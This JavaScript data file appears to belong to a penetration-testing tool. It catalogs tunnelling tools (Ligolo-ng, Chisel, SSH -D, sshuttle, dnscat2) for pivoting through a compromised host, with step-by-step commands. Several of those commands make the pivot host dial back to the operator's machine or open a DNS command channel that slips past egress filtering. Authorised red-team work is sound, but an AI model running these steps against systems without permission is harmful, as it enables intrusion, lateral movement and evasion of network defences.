/*!
 * obol data — tunnels.js — OBOL.TUNNELS
 *
 * The tunnel-setup catalog: the ways to pivot into a network you can only reach through a compromised
 * host, each with a machine-by-machine setup guide. One shared source so the connectivity panel's
 * chooser and the coach's staging guide never drift. Ligolo-ng is the recommended default (a real
 * routed interface, no proxychains); the rest are offered for when it does not fit.
 *
 * Each tool: { key, name, rec?, kind (socks|route|dns), summary, when, steps:[{where, title, cmd, note}] }
 * where is 'local' (your Kali box) or 'host' (the compromised pivot). cmd carries {{token}}s filled
 * from the engagement params at render time.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  OBOL.TUNNELS = [
    { key: 'ligolo', name: 'Ligolo-ng', rec: true, kind: 'route', moveId: 'pivot-ligolo',
      summary: 'A real routed interface into the subnet. No proxychains, every tool just works.',
      when: 'The best default: you get a normal network route into the hidden subnet, so nmap, impacket and browsers all work unmodified.',
      steps: [
        { where: 'local', title: 'Create the tun interface and start the proxy on Kali', cmd: 'sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert', note: 'One-time interface setup, then the proxy listens on 11601 for the agent. Leave it running.' },
        { where: 'host', title: 'Run the agent on the compromised host', cmd: './agent -connect {{lhost}}:11601 -ignore-cert', note: 'Transfer the agent to the host first. It dials back to your proxy; in the proxy prompt run "session" and pick it.' },
        { where: 'local', title: 'Add a route to the internal subnet, then start', cmd: 'sudo ip route add <internal-cidr> dev ligolo', note: 'Then type "start" in the ligolo prompt. Your box now routes straight into the subnet, no proxychains needed.' },
      ] },
    { key: 'chisel', name: 'Chisel (SOCKS)', kind: 'socks', moveId: 'pivot-chisel-socks',
      summary: 'A reverse SOCKS proxy; run your tools through proxychains.',
      when: 'Great when you cannot add a route (no root on Kali for a tun) but can run a binary on the host.',
      steps: [
        { where: 'local', title: 'Start the chisel server on your Kali box', cmd: 'chisel server -p 8080 --reverse', note: 'Waits for the reverse connection and exposes a SOCKS proxy on 127.0.0.1:1080. Leave it running.' },
        { where: 'host', title: 'Run the chisel client on the compromised host', cmd: './chisel client {{lhost}}:8080 R:socks', note: 'Transfer the chisel binary first, then dial back. R:socks forwards a SOCKS5 tunnel through this box.' },
        { where: 'local', title: 'Send your tools through the tunnel', cmd: 'proxychains -q nmap -sT -Pn <internal-ip>', note: 'Add "socks5 127.0.0.1 1080" to /etc/proxychains4.conf, then prefix tools with proxychains. Use -sT; SYN scans do not traverse SOCKS.' },
      ] },
    { key: 'ssh-dynamic', name: 'SSH dynamic (-D)', kind: 'socks', moveId: 'pivot-ssh-dynamic',
      summary: 'The quickest SOCKS when you already have SSH on the pivot. Nothing to upload.',
      when: 'Fastest path when you hold SSH credentials or a key on the pivot host.',
      steps: [
        { where: 'local', title: 'Open a dynamic SOCKS port over SSH', cmd: 'ssh -D 1080 -N {{user}}@{{target}}', note: 'Opens a local SOCKS5 proxy on 1080 tunneled through the SSH session. -N means no shell.' },
        { where: 'local', title: 'Send tools through proxychains', cmd: 'proxychains -q nmap -sT -Pn <internal-ip>', note: 'Point proxychains at socks5 127.0.0.1 1080.' },
      ] },
    { key: 'sshuttle', name: 'sshuttle', kind: 'route', moveId: 'pivot-sshuttle',
      summary: 'Transparent subnet routing over SSH, with nothing to run on the host.',
      when: 'Clean when you have SSH on the pivot and Python is present there; behaves like a route, no proxychains.',
      steps: [
        { where: 'local', title: 'Route the subnet over SSH from your box', cmd: 'sshuttle -r {{user}}@{{target}} <internal-cidr>', note: 'Runs entirely from your Kali box over the SSH session; traffic to the subnet is transparently tunneled. Needs Python on the pivot.' },
      ] },
    { key: 'dns', name: 'DNS tunnel (dnscat2)', kind: 'dns', moveId: 'dns-tunnel',
      summary: 'A channel over DNS for when only DNS resolves outbound.',
      when: 'Last resort for an egress-filtered host where nothing but DNS leaves the network.',
      steps: [
        { where: 'local', title: 'Start the dnscat2 server on your box', cmd: 'dnscat2-server {{domain}}', note: 'Authoritative for the delegated domain; waits for tunneled sessions.' },
        { where: 'host', title: 'Run the dnscat2 client on the compromised host', cmd: './dnscat2-client {{domain}}', note: 'Tunnels a command channel out over DNS queries when no other egress works.' },
      ] },
  ];
})(typeof globalThis !== 'undefined' ? globalThis : this);
